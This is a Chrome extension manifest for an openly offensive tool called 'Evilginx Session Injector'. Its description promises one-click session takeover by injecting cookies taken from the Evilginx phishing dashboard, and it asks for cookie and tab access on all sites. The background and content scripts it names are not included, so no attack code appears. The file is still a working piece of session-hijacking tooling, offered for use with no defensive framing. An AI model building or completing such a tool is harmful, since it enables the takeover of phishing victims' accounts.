{
  "manifest_version": 3,
  "name": "Evilginx Session Injector",
  "version": "1.0",
  "description": "Automates session cookie injection from the Evilginx dashboard — one-click session takeover.",
  "permissions": ["cookies", "tabs"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"],
      "run_at": "document_idle"
    }
  ]
}
